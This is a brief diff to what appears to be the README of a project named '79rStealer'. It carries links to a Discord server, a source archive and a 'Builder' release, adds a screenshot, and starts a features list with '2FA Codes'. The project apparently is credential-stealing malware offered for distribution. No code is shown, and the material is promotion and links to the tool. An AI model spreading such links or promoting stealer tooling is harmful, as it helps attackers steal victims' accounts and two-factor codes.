@@ -1,5 +1,6 @@
 #### ``-`` [Discord Link](https://discord.gg/Sh236kfpvK) ``-`` [Source](https://github.com/79r/79rStealer/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/79r/79rStealer/releases/tag/Builder) 
 
+![Capture](https://user-images.githubusercontent.com/98587150/151534862-720088db-cc18-4621-a57c-7fd514b5cab8.PNG)
 
 # Features
 - 2FA Codes
